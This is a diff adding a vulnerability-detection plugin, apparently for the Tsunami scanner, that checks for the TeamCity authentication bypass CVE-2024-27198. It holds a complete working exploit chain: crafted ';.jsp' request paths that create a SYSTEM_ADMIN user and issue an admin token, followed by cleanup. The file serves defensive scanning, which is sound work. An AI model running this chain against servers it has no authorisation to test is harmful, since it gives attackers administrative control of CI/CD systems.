@@ -1,0 +1,148 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "JetBrainsTeamCity_CVE_2024_27198"
+  author: "frkngksl"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2024-27198"
+  }
+  severity: CRITICAL
+  title: "JetBrains TeamCity Authentication Bypass Vulnerability (CVE-2024-27198)"
+  description: "JetBrains TeamCity is a continuous integration and continuous deployment (CI/CD) server used by developers to automate building, testing, and releasing software. This vulnerability is a critical authentication-bypass vulnerability in JetBrains TeamCity that allows a remote, unauthenticated attacker to access endpoints meant to be protected and perform high-privilege actions."
+  recommendation: "Update the version to 2023.11.4 or later."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2024-27198"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_teamcity"
+  http_request: {
+    method: GET
+    uri: "/login.html"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "<title>Log in to TeamCity" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "create_admin_user"
+  http_request: {
+    method: POST
+    uri: "/hax?jsp=/app/rest/users;.jsp"
+    headers: [
+      { name: "Accept" value: "*/*" },
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"username\": \"tsunamitest\", \"password\": \"tsunamitest\", \"email\": \"tsunami@tsunami.com\", \"roles\": {\"role\": [{\"roleId\": \"SYSTEM_ADMIN\", \"scope\": \"g\"}]}}"
+    response: {
+      http_status: 200
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "<user username=\"tsunamitest\" id=\"([^\"]+)\""
+            variable_name: "userid"
+          }
+        ]
+      }
+    }
+  }
+  cleanup_actions: "delete_added_user"
+}
+
+actions: {
+  name: "create_admin_token"
+  http_request: {
+    method: POST
+    uri: "/hax?jsp=/app/rest/users/id:{{ userid }}/tokens/testtoken;.jsp"
+    headers: [
+      { name: "Accept" value: "*/*" },
+      { name: "Content-Type" value: "application/json" }
+    ]
+    response: {
+      http_status: 200
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "value=\"([^\"]+)\""
+            variable_name: "usertoken"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "get_user_list"
+  http_request: {
+    method: GET
+    uri: "/app/rest/users"
+    headers: [
+      { name: "Accept" value: "*/*" },
+      { name: "Authorization" value: "Bearer {{ usertoken }}" }
+    ]
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: 'username="tsunamitest"' }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "delete_added_user"
+  http_request: {
+    method: DELETE
+    uri: "/app/rest/users/id:{{ userid }}"
+    headers: [
+      { name: "Accept" value: "*/*" },
+      { name: "Authorization" value: "Bearer {{ usertoken }}" }
+    ]
+    response: {
+      http_status: 204
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "fingerprint_teamcity",
+    "create_admin_user",
+    "create_admin_token",
+    "get_user_list"
+  ]
+}
